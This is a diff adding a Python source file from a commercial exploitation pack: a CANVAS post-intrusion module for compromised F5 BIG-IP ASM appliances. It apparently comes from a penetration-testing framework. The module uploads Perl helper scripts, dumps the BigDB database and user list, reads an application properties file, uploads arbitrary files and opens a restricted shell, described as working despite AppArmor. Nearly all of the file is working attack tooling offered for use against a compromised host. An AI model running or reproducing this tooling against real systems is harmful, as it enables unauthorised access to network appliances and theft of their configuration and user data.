@@ -1,0 +1,238 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+import sys, os, cmd, time
+
+sys.path.append(".")
+sys.path.append("3rdparty/D2SEC/libs")
+
+from canvasexploit import canvasexploit
+
+from exploitutils import *
+import libs.canvasos as canvasos
+import canvasengine
+from shelllistener import *
+from threading import Lock
+
+from shellserver import unixshellserver
+from MOSDEFShellServer import MSSgeneric
+
+NAME = "F5 Networks ASM Post intrusion"
+DESCRIPTION = "Module to get post intrusion informations and to run some commands useful to an attacker."
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Date public"] = ""
+DOCUMENTATION["References"] = ""
+DOCUMENTATION["Versions Affected"] = ""
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = ""
+DOCUMENTATION["CVE Url"] = ""
+DOCUMENTATION["Notes"] = """
+The module d2sec_f5asm permits to get a MOSDEF instance on a F5 BIG IP. You can run a shellshock but it will be restricted by apparmor.
+
+This module permits to get post intrusion informations and to run some commands useful to an attacker despite apparmor.
+"""
+
+VERSION="0.1"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Post-Intrusion"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+class theexploit(cmd.Cmd, canvasexploit):
+	def __init__(self):
+		canvasexploit.__init__(self)
+		cmd.Cmd.__init__(self)
+
+		self.name = NAME
+		self.prompt = ""
+		self.node = []
+		self.flog = None 
+		self.intro = """
+[#] F5 ASM Cmdline session.   
+[#] Type ? for help
+"""
+
+	def emptyline(self):
+		print "Type 'quit' to terminate this session or type ? for help"
+
+	def default(self, line):
+		print "*** Unknown Syntax : %s (type help for a list of valid command)" % line
+	
+	def do_help(self, arg):
+		"""Help\n"""
+		help = """
+Command 
+---------------
+bigdb      - Display BigDB database
+bigusers   - Get users list 
+bigfiles   - Display bigip system files
+
+upload     - upload a file 
+shell      - run a shellshock on the node
+
+Misc
+------
+help       - This help
+log        - Log output to file
+list       - List available nodes
+quit       - Quit
+"""
+		print help
+
+	######################################################################
+	def initshell(self):
+	
+		perlscripts = [
+			'cat.pl',
+			'ls.pl',
+		]
+
+		for perlsc in perlscripts:
+			src = os.getcwd() + '/3rdparty/D2SEC/exploits/d2sec_f5post/' + perlsc
+			dst = '/shared/core/' + perlsc
+			self.node.shell.upload(src, "", dst)
+		return
+
+	######################################################################
+	def do_log(self, arg):
+		"""\nLog this session: 'log start <logfile>' to start logging and 'log stop' to stop logging\n"""
+		args = arg.split()
+
+		usage = """
+usage: log start <logfile>
+       log stop
+		"""
+
+		if len(args) < 1:
+			print usage
+			return 
+
+		if args[0] == "start":
+			if len(args) < 2:
+				print usage
+				return
+			self.flog = args[1]
+		elif args[0] == "stop":
+			self.flog = None
+		else:
+			print usage
+			
+	def write_log(self, data):
+		if len(data) >= 0 and self.flog is not None:
+			try:
+				f = open(self.flog, "a")
+			except:
+				print "Can't open log file %s" % self.flog
+				return
+
+			f.write(data)
+			f.close()
+
+	######################################################################
+	def do_bigdb(self, arg):
+		"""\rDisplay BigDB database\n"""
+
+		data = ""
+		data += "\nBigDB database\n"
+		data += "-----------------------\n\n"
+		data += self.node.shell.runcommand("bigpipe db")
+		print data
+		self.write_log(data)
+		return
+
+  ######################################################################
+	def do_bigusers(self, arg):
+		"""\rDisplay bigip users list\n"""
+
+		data = ""
+		data += "\nUsers list\n"
+		data += "-----------------------\n\n"
+		data += self.node.shell.runcommand("bigpipe list")
+		print data
+		self.write_log(data)
+		return
+
+
+	######################################################################
+	def do_bigfiles(self, arg):
+		"""\nDisplay bigip system files\n"""
+		files = [
+			'/usr/local/www/tmui/WEB-INF/properties/application.properties'
+		]
+
+		data = ""
+		for file in files:
+			data += '[#] %s\n\n' % file
+			data += self.node.shell.runcommand("perl /shared/core/cat.pl %s" % file)
+			data += '\n' 
+
+		print data
+		self.write_log(data)
+		return
+
+	######################################################################
+	def do_upload(self, arg):
+		"""\nUpload a file to the remote host: upload <srcfile>\n"""
+		args = arg.split()
+
+		if len(args) != 1:
+			print "Usage: upload <srcfile>\n"
+			return
+
+		src = args[0]
+		dst = '/shared/core/'+os.path.basename(src)
+
+		if not os.path.exists(src):
+			print "Source file %s not found !\n" % src
+			return
+
+		print "[#] uploading %s to %s" % (src, dst)
+		try:
+			self.node.shell.upload(src, "", dst)
+		except NodeCommandError:
+			return
+
+		print "[#] uploaded !\n"
+
+	######################################################################
+	def do_shell(self, arg):
+		"""\nRun a shellshock on the node\n"""
+		print "Use :"
+		print "perl /shared/core/cat.pl <file> : command cat"
+		print "perl /shared/core/ls.pl <name> : command ls"
+		self.node.shell.shellshock()
+
+
+	######################################################################
+	def do_quit(self, arg):
+		"""\nQuit...\n"""
+		print "Quit...\n"
+		return -1
+
+	######################################################################
+	def run(self):
+		self.setInfo("%s (in progress)"%(NAME))
+
+		self.node = self.argsDict["passednodes"][0]
+		
+		self.prompt = "f5> "
+		self.initshell()
+		self.cmdloop()
+
+		self.setInfo("%s (finished)"%(NAME))
+		return 1
+
+if __name__ == "__main__":
+	print "Running CANVAS %s v %s" % (NAME,VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
+
